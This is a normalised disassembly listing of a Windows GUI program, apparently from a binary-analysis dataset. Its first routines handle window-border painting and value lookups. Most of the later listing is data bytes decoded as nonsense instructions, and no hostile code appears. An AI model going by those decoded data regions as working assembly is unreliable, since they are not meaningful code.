sub_42f27c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
movzx edx [ ebp - 0xc ]
mov eax ebx
call sub_42f180
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_42f2c0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax [ ebp + 0x10 ]
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov al 0x1
test eax eax
je r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
movzx edx [ ebx ]
mov eax esi
call sub_42f180
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb eax eax
inc eax
jmp r-xdata
test al al
je r-xdata
sub_42f328
mov [ ecx ] 0x3
mov eax edx
add al 0xfe
sub al 0x7
jb r-xdata
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
je r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
mov [ ecx + 0x4 ] 0x2
mov eax 0x9
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
sub_42f364
mov [ ecx ] 0xa
movzx eax dl
cmp eax 0x11
ja r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
movzx eax [ eax + lookup_table_42f37d ]
jmp [ eax * 4 + jump_table_42f38f ]
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x3
jmp r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0x4
jmp r-xdata
mov [ ecx + 0x4 ] 0x4
mov eax 0xa
jmp r-xdata
mov [ ecx + 0x4 ] 0x5
mov eax 0xe
jmp r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
sub_42f400
mov [ ecx ] 0x17
movzx eax dl
cmp eax 0x68
ja r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
movzx eax [ eax + lookup_table_42f41d ]
jmp [ eax * 4 + jump_table_42f486 ]
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x5
jmp r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0x8
jmp r-xdata
mov [ ecx + 0x4 ] 0x4
mov eax 0xb
jmp r-xdata
mov [ ecx + 0x4 ] 0x5
mov eax 0xe
jmp r-xdata
mov [ ecx + 0x4 ] 0x6
mov eax 0x11
jmp r-xdata
mov [ ecx + 0x4 ] 0x7
mov eax 0x14
jmp r-xdata
mov [ ecx + 0x4 ] 0x8
mov eax 0x16
jmp r-xdata
mov [ ecx + 0x4 ] 0x9
mov eax 0x18
jmp r-xdata
mov [ ecx + 0x4 ] 0xa
mov eax 0x1a
jmp r-xdata
mov [ ecx + 0x4 ] 0xb
mov eax 0x1c
jmp r-xdata
mov [ ecx + 0x4 ] 0xc
mov eax 0x1e
jmp r-xdata
mov [ ecx + 0x4 ] 0xd
mov eax 0x20
jmp r-xdata
mov [ ecx + 0x4 ] 0xe
mov eax 0x24
jmp r-xdata
mov [ ecx + 0x4 ] 0xf
mov eax 0x28
jmp r-xdata
mov [ ecx + 0x4 ] 0x10
mov eax 0x2c
jmp r-xdata
mov [ ecx + 0x4 ] 0x11
mov eax 0x30
jmp r-xdata
mov [ ecx + 0x4 ] 0x12
mov eax 0x34
jmp r-xdata
mov [ ecx + 0x4 ] 0x13
mov eax 0x38
jmp r-xdata
mov [ ecx + 0x4 ] 0x14
mov eax 0x3c
jmp r-xdata
mov [ ecx + 0x4 ] 0x15
mov eax 0x40
jmp r-xdata
mov [ ecx + 0x4 ] 0x16
mov eax 0x44
jmp r-xdata
mov [ ecx + 0x4 ] 0x17
mov eax 0x48
jmp r-xdata
mov [ ecx + 0x4 ] 0x18
mov eax 0x4c
jmp r-xdata
mov [ ecx + 0x4 ] 0x19
mov eax 0x50
jmp r-xdata
mov [ ecx + 0x4 ] 0x1a
mov eax 0x54
jmp r-xdata
mov [ ecx + 0x4 ] 0x1b
mov eax 0x58
jmp r-xdata
mov [ ecx + 0x4 ] 0x1c
mov eax 0x5c
jmp r-xdata
mov [ ecx + 0x4 ] 0x1d
mov eax 0x60
jmp r-xdata
mov [ ecx + 0x4 ] 0x1e
mov eax 0x61
jmp r-xdata
mov [ ecx + 0x4 ] 0x1f
mov eax 0x62
jmp r-xdata
mov [ ecx + 0x4 ] 0x20
mov eax 0x63
jmp r-xdata
mov [ ecx + 0x4 ] 0x21
mov eax 0x64
jmp r-xdata
mov [ ecx + 0x4 ] 0x22
mov eax 0x65
jmp r-xdata
mov [ ecx + 0x4 ] 0x23
mov eax 0x66
jmp r-xdata
mov [ ecx + 0x4 ] 0x24
mov eax 0x67
jmp r-xdata
mov [ ecx + 0x4 ] 0x25
mov eax 0x68
jmp r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
sub_42f78c
push ebp
mov ebp esp
add esp 0xffffffbc
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
push 0xffffffec
mov eax [ ebp - 0x4 ]
call sub_443be8
push eax
call GetWindowLongA
test ah 0x2
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_443be8
push eax
call GetWindowRect
mov eax [ ebp - 0x24 ]
neg eax
push eax
mov eax [ ebp - 0x28 ]
neg eax
push eax
lea eax [ ebp - 0x28 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
call sub_443be8
push eax
call GetWindowDC
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_42f8e7
push [ fs : edx ]
mov [ fs : edx ] esp
push esi
lea esi [ ebp - 0x28 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
test bl bl
je r-xdata
mov eax [ ebp - 0x1c ]
sub eax 0x2
push eax
mov eax [ ebp - 0x20 ]
sub eax 0x2
push eax
mov eax [ ebp - 0x24 ]
add eax 0x2
push eax
mov eax [ ebp - 0x28 ]
add eax 0x2
push eax
mov eax [ ebp - 0x8 ]
push eax
call ExcludeClipRect
lea ecx [ ebp - 0x34 ]
mov dl 0x2
mov eax esi
call sub_42f328
lea eax [ ebp - 0x28 ]
push eax
push 0x0
lea ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_42f27c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_443be8
push eax
call ReleaseDC
retn
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_443be8
push eax
call GetWindowLongA
test eax 0x100000
je r-xdata
test eax 0x200000
je r-xdata
push 0x2
call GetSystemMetrics
mov edi eax
push 0x3
call GetSystemMetrics
mov ebx eax
push 0xfffffffe
push 0xfffffffe
lea eax [ ebp - 0x18 ]
push eax
call InflateRect
mov eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x44 ]
push eax
mov edx [ ebp - 0xc ]
sub edx ebx
mov eax [ ebp - 0x10 ]
sub eax edi
mov ecx [ ebp - 0x10 ]
call sub_415370
push esi
lea esi [ ebp - 0x44 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push 0xf
call GetSysColorBrush
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call FillRect
sub_42f914
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42f959
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f960
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov eax rw-data
call sub_404e44
mov eax [ rw-data ]
call sub_403f64
sub_42f968
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al 0xf9
inc edx
add [ eax + eax ] cl
add [ eax ] al
les eax [ edx + 0x41ac0040 ]
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add [ edx ] cl
inc ebp
dec ebp
outsb
jne r-xdata
add dl bh
inc edx
add [ eax ] cl
adc [ ebp + ecx * 2 + 0x65 ] dl
outsb
jne r-xdata
jb r-xdata
add ah dl
std
push 0x65676e61
inc ebp
or [ gs : ebp + ecx * 2 + 0x65 ] edx
outsb
outsd
jb r-xdata
pop es
jb r-xdata
jb r-xdata
outsb
je r-xdata
arpl [ eax + ecx + 0x7 ] si
je r-xdata
rcr [ edx + 0x59 ] 0x59
mov [ fs : eax ] edx
push sub_42f960
retn
sar cl 0x42
add [ ebx ] al
or dl [ ebp + ecx * 2 + 0x65 ]
outsb
jne r-xdata
add [ eax ] cl
sbb dl [ ecx + eax * 2 + 0x64 ]
jbe r-xdata
ja r-xdata
inc ecx
inc ebx
popad
outsb
jbe r-xdata
or [ edi ] al
push esp
dec edi
bound ebp [ edx + 0x65 ]
add ecx [ eax ]
push es
push ebx
outsb
jb r-xdata
jb r-xdata
jae r-xdata
inc edx
outsd
outsd
insb
popad
arpl [ eax + eax + 0x8 ] si
inc edx
add [ eax ] al
adc [ eax ] al
pop eax
cli
insd
add [ edi ] al
push edx
bound esi [ gs : ebp + 0x69 ]
insb
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ eax ] dl
adc [ eax ] eax
aam 0xfd
jbe r-xdata
outsb
inc ebp
jb r-xdata
mov [ eax ] fs
inc edx
add [ eax ] al
add [ eax ] al
add [ edx + esi * 2 - 0x4c3ffc0 ] ah
outsb
arpl [ ebp + 0x64 ] sp
outsb
add [ eax ] dl
adc [ eax ] eax
mov [ eax ] fs
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
nop
je r-xdata
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
or [ edi ] al
inc ecx
inc ebx
popad
outsb
jbe r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x7 ] si
adc [ 0x63655241 ] al
push esp
inc ebx
popad
outsb
jbe r-xdata
jne r-xdata
outsb
popad
imul eax [ ecx ] 0x0
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ ecx + edi * 8 + 0x6d060042 ] bh
bound ecx [ esi + 0x6f ]
outsb
pop es
insd
bound eax [ edx + 0x72 ]
popad
imul ecx [ edx ] 0x6d
bound eax [ edx + 0x61 ]
jb r-xdata
jb r-xdata
popad
jae r-xdata
push esp
dec edi
ja r-xdata
jb r-xdata
insd
inc ebp
jbe r-xdata
push ebx
insb
add [ eax ] cl
arpl [ ebp + 0x9 ] sp
push esp
dec ebp
jb r-xdata
jae r-xdata
push esp
push edx
arpl [ gs : eax + eax + 0x8 ] si
arpl [ gs : eax + ecx + 0x7 ] si
jae r-xdata
jb r-xdata
adc [ ecx ] dl
inc eax
add [ eax + 0x103c0042 ] cl
popad
add [ bx + si ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + 0xb0042fb ] ch
insd
jb r-xdata
push 0x6e490774
jb r-xdata
inc edx
add [ eax ] cl
adc eax 0x6e654d54
add [ ebx + edi * 8 ] bh
ja r-xdata
dec ebp
outsb
jne r-xdata
outsb
je r-xdata
or [ edi ] al
inc ecx
inc ebx
popad
outsb
jbe r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
adc [ 0x63655241 ] al
push esp
inc ebx
popad
outsb
jbe r-xdata
arpl [ gs : ebp + 0x64 ] si
pop es
insb
je r-xdata
add eax 0x63655241
inc edx
add [ eax ] cl
adc dl [ ebp + ecx * 2 + 0x65 ]
outsb
jne r-xdata
popad
imul eax [ 0x756e654d ] 0x73
lea eax [ eax ]
je r-xdata
je r-xdata
inc eax
add [ eax - 0x43ffbfbf ] bh
outsd
insd
popad
je r-xdata
jne r-xdata
dec ebp
outsb
dec ecx
je r-xdata
dec ebp
outsb
jne r-xdata
jb r-xdata
arpl [ eax + ecx + 0x7 ] si
jb r-xdata
ja r-xdata
je r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
popad
inc ecx
jne r-xdata
jae r-xdata
add [ 0x74617453 ] al
andps xmm1 [ gs : edi + 0x77 ]
push esp
push edx
arpl [ gs : eax + eax + 0x5 ] si
push ebx
je r-xdata
jae r-xdata
inc ebx
add [ ebx ] bh
inc esi
insb
popad
add [ bx + si ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + 0x50042fb ] ch
dec ebp
outsb
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
cld
insd
inc ecx
jne r-xdata
mov [ eax ] dl
inc ebx
add [ eax + edx + 0x11180043 ] bh
add al bl
push cs
inc ebx
add [ eax ] cl
jecxz r-xdata
fdiv [ edx + 0x41ac0044 ]
arpl [ eax ] cx
insd
popad
dec ebp
popad
insd
inc ebp
jbe r-xdata
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add ah dl
loop r-xdata
add [ eax ] al
add ah bl
jne r-xdata
jb r-xdata
add [ 0x74646957 ] eax
je r-xdata
jne r-xdata
dec ebp
outsb
insd
inc ebp
jbe r-xdata
push esp
inc ebx
popad
outsb
jbe r-xdata
je r-xdata
popad
je r-xdata
add eax 0x63655241
cwde
adc [ ebx ] eax
lodsb [ esi ]
mov edx 0xbab00044
add [ ebx + 0x41 ] dh
add [ edi + ecx ] bl
inc ebx
add [ edi + ecx + 0x43 ] dl
add [ edi + ecx + 0x10180043 ] al
inc ebx
add [ edi + ecx - 0x45cfffbd ] dh
inc esp
add ah ah
cmovae eax [ eax ]
push esp
adc [ ebx ] al
inc ebx
add [ eax ] bh
adc [ ebx ] eax
pop eax
adc [ ebx ] eax
js r-xdata
cmovae eax [ eax ]
test [ edi ] cl
inc ebx
add [ eax ] bl
adc [ ebx ] al
mov ah 0xf
inc ebx
add [ eax ] dh
mov edx 0xfe40044
inc ebx
add [ eax + edx + 0x43 ] dl
add [ eax - 0x43ffbcf0 ] cl
adc [ ebx ] al
mov eax eax
cld
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsd
inc esi
insb
add [ ecx + edx + 0x11d80043 ] dh
inc ebx
add al bh
adc [ ebx ] eax
sbb [ edx ] dl
inc ebx
add ah dh
push cs
inc ebx
add [ edi ] cl
push esp
dec ebp
outsb
jne r-xdata
inc esp
inc ebx
add [ edx + edi * 4 + 0x11980044 ] ah
inc ebx
add [ edx + edi * 4 - 0x454fffbc ] ch
sbb [ ecx ] dl
inc ecx
add [ eax ] bh
adc al [ ebx ]
mov edx fs
inc ecx
add [ eax ] ah
jecxz r-xdata
add al dh
adc [ ebx ] al
cmp al 0xe3
mov dl 0x44
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
insb
or [ ebp + 0x61 ] ch
push eax
popad
jb r-xdata
outsb
je r-xdata
outsd
je r-xdata
dec eax
imul esp [ gs : edi + 0x68 ] 0x6e490774
push es
je r-xdata
dec ebp
outsb
je r-xdata
outsb
jne r-xdata
imul esp [ ebx + 0x8 ] 0x614d616d
jae r-xdata
push 0x746e4907
outsb
andps xmm1 [ edi + 0x77 ]
rol [ ecx + 0x40 ] 0x0
mov ah 0x41
inc eax
add ah bh
inc eax
add [ eax ] bl
aas
inc eax
add al ah
adc al [ ebx ]
dec eax
cmp al 0x43
add ah ah
sbb [ ebx ] al
enter 0x416d 0x0
sub al 0x17
inc ebx
add ah al
cmp al 0x43
add ah dl
fiadd [ ecx ]
int3
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test ch bh
inc edx
add al bl
std
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi - 0x35ffbd03 ] bl
std
inc edx
add [ eax + eax + 0x50700000 ] ch
inc ecx
add al ch
loope r-xdata
add [ eax ] al
loopne r-xdata
inc edx
add [ eax + eax ] bl
add [ eax ] al
inc ecx
inc eax
add al al
inc ecx
outsb
je r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
je r-xdata
add [ eax ] dl
adc [ eax ] eax
add al 0x8
push es
push ebx
outsb
jb r-xdata
push edi
imul esp [ esp + esi * 2 + 0x68 ] 0x746e4907
add eax 0x74646957
fcomp st6
inc ecx
add [ eax ] cl
loop r-xdata
add [ eax + 0x24004041 ] bh
fild [ ecx ]
hlt
dec ebp
outsb
jne r-xdata
inc eax
add [ eax + edx ] bh
inc eax
add [ ebx + 0x42fbacc0 ] cl
add [ ebx ] al
adc [ ebp + ecx * 2 + 0x65 ] edx
outsb
add [ eax ] dl
adc [ eax ] eax
mov [ eax ] fs
inc edx
add [ eax + edx ] bh
dec ecx
outsb
clc
push edx
push ecx
jmp eax
add [ edx + edx + 0x43 ] ah
add [ eax + 0x2e ] ah
inc ebx
add [ eax + 0x1b ] al
inc ebx
add [ eax + esi ] dh
inc ebx
add [ eax + 0x60004337 ] ch
xor eax 0x369c0043
inc ebx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + 0x30004010 ] dh
add [ eax ] al
add [ eax + 0x58004010 ] dh
add [ eax ] al
add [ edi ] al
add bh ch
sub_430118
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushfd
add [ ebx ] eax
aam 0x1
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi - 0x37ffbcff ] ch
add [ ebx ] eax
pop eax
add [ eax ] al
add [ eax + 0x50 ] dh
inc ecx
add al ch
loope r-xdata
fcomp st6
inc ecx
add [ eax ] cl
loop r-xdata
add [ eax + 0x24004041 ] bh
fild [ ecx ]
rol [ ecx + 0x40 ] 0x0
mov ah 0x41
inc eax
add ah bh
inc eax
add [ eax ] bl
aas
outsb
jne r-xdata
add [ eax + 0x46 ] dh
inc ebx
add [ ecx + edx * 2 + 0x43 ] al
add [ eax + 0x47 ] dh
inc ebx
add [ ecx + edx * 2 + 0x43 ] dh
inc eax
add [ edi + eax * 2 ] bl
inc ebx
add [ esi + ebp * 2 - 0x2213ffbf ] ch
inc ecx
add al cl
insd
inc ecx
add [ ecx + edx * 2 + 0x43 ] bl
add al bh
push ecx
inc ebx
add ah dl
fiadd [ ecx ]
int3
rcl ah 0x1
inc ebx
add [ edi ] al
add eax 0x6e654d54
jne r-xdata
call 0xffffffffb8434422
inc ecx
inc eax
add [ ebx + ebx * 8 ] ah
inc ecx
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ ebx ] eax
insb
push ecx
inc ecx
add [ ebx ] al
add [ 0x756e654d ] al
jae r-xdata
aam 0xfd
inc edx
add [ eax + eax ] dh
add bh bh
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al [ eax ]
add eax 0x6d657449
jae r-xdata
add ah dl
std
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + 0x3c004010 ] dh
add [ eax ] al
add [ eax + eax ] al
std
inc eax
add [ edx + eax + 0x43 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4302 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x60004302 ] bl
add [ eax ] al
add [ ecx + eax ] dl
inc ebx
add al ch
loope r-xdata
fcomp st6
inc ecx
add [ eax ] cl
loop r-xdata
add [ eax ] bl
aas
inc eax
add [ edi + eax * 2 ] bl
inc ebx
add [ esi + ebp * 2 - 0x2213ffbf ] ch
inc ecx
add al cl
insd
inc ecx
add [ ecx + edx * 2 + 0x43 ] bl
add al bh
push ecx
inc ebx
add ah dl
fiadd [ ecx ]
int3
add [ eax + 0x24004041 ] bh
fild [ ecx ]
rol [ ecx + 0x40 ] 0x0
mov ah 0x41
inc eax
add ah bh
inc eax
add [ esi + edx * 2 + 0x43 ] dh
add [ eax + 0x46 ] dh
inc ebx
add [ ecx + edx * 2 + 0x43 ] al
add [ edi + edx * 2 + 0x56dc0043 ] bl
inc ebx
add [ ecx ] cl
push esp
dec ebp
popad
imul ebp [ esi + 0x4d ] 0x8b756e65
shr [ eax + 0x7004302 ] 0x9
push esp
dec ebp
popad
imul ebp [ esi + 0x4d ] 0x5c756e65
add al [ ebx ]
rol [ ecx ] 0x1
inc ebx
add [ ebx ] cl
add [ 0x756e654d ] al
jae r-xdata
push es
add [ eax ] cl
inc edx
imul eax [ ecx + ebp * 2 + 0x4d ] 0x2465646f
cdq
dec eax
outsd
je r-xdata
add [ esi + edx * 2 + 0x10043 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
or eax [ ecx + 0x75 ]
je r-xdata
add al dh
sti
inc edx
adc [ eax ] al
inc eax
add [ eax ] al
jns r-xdata
inc esp
add [ eax ] cl
add bh bh
mov esp 0x1004351
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49060007 ] al
insd
popad
jae r-xdata
and al 0x99
sub_430214
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test al 0x2
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x60004302 ] bl
add [ eax ] al
add [ ecx + eax ] dl
inc ebx
add al ch
loope r-xdata
fcomp st6
inc ecx
add [ eax ] cl
loop r-xdata
add [ eax + 0x24004041 ] bh
fild [ ecx ]
rol [ ecx + 0x40 ] 0x0
mov ah 0x41
inc eax
add ah bh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + eax * 2 ] bl
inc ebx
add [ esi + ebp * 2 - 0x2213ffbf ] ch
inc ecx
add al cl
insd
inc ecx
add [ ecx + edx * 2 + 0x43 ] bl
add al bh
push ecx
inc ebx
add ah dl
fiadd [ ecx ]
int3
add [ esi + edx * 2 + 0x43 ] dh
add [ eax + 0x46 ] dh
inc ebx
add [ ecx + edx * 2 + 0x43 ] al
add [ edi + edx * 2 + 0x56dc0043 ] bl
inc ebx
add [ ecx ] cl
push esp
dec ebp
popad
imul ebp [ esi + 0x4d ] 0x8b756e65
shr [ eax + 0x7004302 ] 0x9
push esp
dec ebp
popad
imul ebp [ esi + 0x4d ] 0x5c756e65
add al [ ebx ]
rol [ ecx ] 0x1
inc ebx
add [ ebx ] cl
add [ 0x756e654d ] al
jae r-xdata
push es
add [ eax ] cl
inc edx
imul eax [ ecx + ebp * 2 + 0x4d ] 0x2465646f
cdq
dec eax
outsd
je r-xdata
add [ esi + edx * 2 + 0x10043 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
or eax [ ecx + 0x75 ]
je r-xdata
add al dh
sti
inc edx
adc [ eax ] al
inc eax
add [ eax ] al
jns r-xdata
inc esp
add [ eax ] cl
add bh bh
mov esp 0x1004351
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49060007 ] al
insd
popad
jae r-xdata
and al 0x99
sub_4303f1
add eax [ ebx ]
add ecx [ edi ]
push esp
push eax
outsd
jo r-xdata
je r-xdata
jo r-xdata
push esp
dec ebp
outsb
jne r-xdata
inc ebx
je r-xdata
insb
imul esp [ edi + 0x6e ] 0x746e656d
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add al dh
add eax [ ebx ]
push es
jo r-xdata
insd
popad
inc edx
outsd
outsb
push esp
outsd
dec esp
je r-xdata
add [ eax ] bl
aas
inc eax
add ah dh
pop ebp
inc ebx
add [ esi + ebp * 2 - 0x2213ffbf ] ch
inc ecx
add al cl
insd
inc ecx
add [ ecx + edx * 2 + 0x43 ] bl
add al bh
push ecx
inc ebx
add ah dl
fiadd [ ecx ]
int3
outsd
insd
push esp
outsd
push esp
outsd
jo r-xdata
add [ eax ] al
add [ eax + eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x0
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
je r-xdata
outsd
insd
insd
popad
dec esi
outsd
outsb
add eax 0x756e654d
outsb
or al 0x74
bound ecx [ ebp + 0x66 ]
je r-xdata
or [ eax + 0x61 ] dh
jo r-xdata
jae r-xdata
add eax 0x756e654d
popad
dec esp
je r-xdata
inc ebx
add [ 0x654c616d ] cl
je r-xdata
outsd
fadd [ ebx + eax * 2 ]
je r-xdata
jne r-xdata
jo r-xdata
jb r-xdata
imul ebp [ ebp + 0x61 ] 0x6e6f6974
jae r-xdata
inc ebx
outsb
je r-xdata
push edx
imul esp [ edi + 0x68 ] 0x61700874
add al 0x43
outsd
add [ ebp + 0x5400040 ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
imul ebp [ ebp + 0x61 ] 0x6e6f6974
add [ eax + 0x4 ] esi
inc ebx
add [ ebx ] al
andps xmm1 [ ebp + 0x65 ]
outsb
add al 0x43
inc ecx
inc eax
add [ ebx + ebx * 8 ] ah
inc ecx
add al al
inc ecx
outsb
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + eax + 0x43 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test [ 0x780043 ] al
je r-xdata
outsd
dec esp
add [ esi ] al
push cs
push esp
dec ebp
outsb
jne r-xdata
je r-xdata
xor al 0x4
inc ebx
add [ ebx ] al
or al 0x54
push esp
jb r-xdata
dec ebp
outsb
jne r-xdata
fcomp st6
inc ecx
add [ eax ] cl
loop r-xdata
add [ eax + 0x24004041 ] bh
fild [ ecx ]
rol [ ecx + 0x40 ] 0x0
mov ah 0x41
inc eax
add ah bh
inc eax
or eax 0x6f42616d
insd
outsb
add eax 0x756e654d
jae r-xdata
push edx
imul esp [ edi + 0x68 ] 0x616d0d74
arpl [ ebx + 0x42 ] bp
jne r-xdata
push edx
imul esp [ edi + 0x68 ] 0x4c6f5474
outsb
jne r-xdata
add [ eax + 0x4400435d ] al
push ecx
inc ebx
add [ eax + 0x47 ] dh
inc ebx
add [ ecx + edx * 2 + 0x43 ] dh
add [ eax ] ch
pop esi
inc ebx
add ah ah
pop esi
inc ebx
add [ edx ] cl
push esp
push eax
outsd
jo r-xdata
add [ eax ] al
adc al 0x1
inc ebx
add al ch
loope r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + eax + 0x780043 ] al
outsd
inc edx
outsd
je r-xdata
jo r-xdata
je r-xdata
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
inc eax
add [ ecx ] ah
add bh bh
popad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push es
add [ ecx ] cl
inc ecx
jne r-xdata
or eax 0x4303f000
add [ eax ] ah
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax - 0x57ffbcaa ] bl
push esi
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jo r-xdata
popad
push esp
outsd
outsb
add [ eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] dh
add al 0x43
add [ 0x69526274 ] cl
push 0x74754274
je r-xdata
imul eax [ eax ] 0x69ff00
outsd
push eax
outsd
jo r-xdata
dec eax
insb
dec esp
imul ebp [ esi + 0x65 ] 0x75646552
